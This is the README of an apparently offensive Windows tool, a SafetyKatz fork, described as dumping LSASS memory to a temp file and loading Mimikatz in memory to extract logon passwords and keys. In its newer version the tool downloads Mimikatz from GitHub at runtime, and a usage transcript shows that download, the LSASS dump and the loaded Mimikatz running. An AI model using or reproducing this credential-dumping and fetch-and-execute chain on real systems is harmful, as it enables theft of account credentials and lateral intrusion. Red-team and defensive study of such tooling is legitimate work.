# BetterSafetyKatz?

----

#### This release
This modified fork of SafetyKatz dynamically fetches the latest pre-compiled release of Mimikatz directly from the gentilkiwi GitHub repo, and uses @subtee's PE Loader to get it into memory.
It still does the MiniDumpWriteDump, but since this is the original verson of Mimikatz, it does no automatically read from the dump file (You will have to input that yourself)
However working on getting that working via CreateThread

Credits to [@Mrtn9](https://twitter.com/Mrtn9) for his collab on this!

#### Old release
SafetyKatz is a combination of slightly modified version of [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Mimikatz](https://github.com/gentilkiwi/mimikatz/) project and [@subtee](https://twitter.com/subtee)'s [.NET PE Loader](https://github.com/re4lity/subTee-gits-backups/blob/master/PELoader.cs).
First, the [MiniDumpWriteDump](https://docs.microsoft.com/en-us/windows/desktop/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump) Win32 API call is used to create a minidump of LSASS to C:\Windows\Temp\debug.bin. Then @subtee's PELoader is used to load a customized version of Mimikatz that runs
**sekurlsa::logonpasswords** and **sekurlsa::ekeys** on the minidump file, removing the file after execution is complete.

#### Modifications

* @subtee's PE Loader was slightly modified so some of the pointer arithmetic worked better on .NET 3.5
* @gentilkiwi's Mimikatz project was modified to strip some functionality for size reasons, and to automatically run the sekurlsa::minidump mode (deleting the minidump file after). If you don't trust my compiled version, feel free to build it yourself :)


[@harmj0y](https://twitter.com/harmj0y) is the primary author of this port.

SafetyKatz is licensed under the BSD 3-Clause license.

## Usage

    PS D:\Projects\SafetyKatz\SafetyKatz\bin\Debug> .\SafetyKatz.exe                                                      
	
	[+] Contacting gentilkiwi -> https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200502/mimikatz_trunk.zip
	[*] Dumping lsass (840) to C:\Windows\Temp\debug.bin
	[+] Dump successful!
	[+] Run the following to parse dump -> : 'sekurlsa::minidump C:\Windows\Temp\debug.bin' then 'sekurlsa::LogonPasswords'

	[*] Executing loaded Mimikatz PE

	  .#####.   mimikatz 2.2.0 (x64) #18362 May  2 2020 16:23:51
	 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
	 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
	 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
	 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
	  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

	mimikatz # coffee

		( (
		 ) )
	  .______.
	  |      |]
	  \      /
	   `----'

	mimikatz #


## Compile Instructions

We are not planning on releasing binaries for SafetyKatz, so you will have to compile yourself :)

SafetyKatz has been built against.NET 3.5 and is compatible with[Visual Studio 2015 Community Edition](https://go.microsoft.com/fwlink/?LinkId=532606&clcid=0x409). Simply open up the project .sln, choose "release", and build.
